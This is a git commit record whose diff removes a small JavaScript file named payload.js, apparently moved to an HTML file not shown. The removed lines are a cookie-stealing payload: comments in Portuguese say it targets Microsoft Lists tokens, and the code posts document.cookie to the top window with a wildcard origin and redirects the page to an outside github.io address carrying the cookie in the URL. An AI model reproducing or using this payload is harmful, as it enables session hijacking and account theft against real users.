6e62e484d32a3495e45dca23ad3487cf1f6aa7e2
Pedro <52047256+pedrojuniorrd@users.noreply.github.com>
2025-05-11 09:32:41 -0300

    Update and rename payload.js to payload.html

--- payload.js
+++
@@ -1,5 +0,0 @@
-// Enviar dados do Microsoft Lists, se possível
-window.top.postMessage(document.cookie, '*');
-
-// Ou redirecionar a página principal para roubar tokens
-window.top.location = 'https://pedrojuniorrd.github.io/_layouts/payload.js?data=' + encodeURIComponent(document.cookie);
